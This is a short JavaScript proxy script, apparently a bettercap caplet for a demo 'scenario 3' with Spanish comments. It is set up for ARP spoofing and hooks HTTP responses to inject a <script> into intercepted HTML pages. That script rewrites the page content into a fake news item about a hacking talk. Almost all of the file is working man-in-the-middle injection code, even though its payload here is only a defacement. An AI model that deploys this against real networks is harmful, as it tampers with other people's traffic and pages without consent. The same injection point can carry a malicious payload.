// script escenario 3
function onLoad() {
  log( "Script loaded." );
  //log("targets: " + env('arp.spoof.targets'));
}

function onResponse(req, res) {
  if( res.ContentType.indexOf('text/html') == 0 ){
    var body = res.ReadBody();
    if( body.indexOf('</head>') != -1 ) {
      log( "Script executed." );
      res.Body = body.replace( 
        'id="content2">',
        'id="content2"><script type="text/javascript"> document.getElementById("content").innerHTML = \'<div role="main" class="site-content" id="content"><div class="block_home_slider" note="475348"><div class="post-image"><img src="http://drive.google.com/uc?export=view&id=1p6mdzEl3G76y81pvj2UqwwoS0VdLyytL" width="620" height="310"></div><div class="post-content"><div class="title">IPG Cyber, presenta su charla de hacking</div></div><div class="post-body">IPG Cyber, equipo de IS de Buenos Aires, se presenta en el día de hoy con una nueva charla de hacking. Toda la gente está sorprendida y expectante.</div></div></div>\'; </script>'
      ); 
    }
  }
}

//á é í ó ú
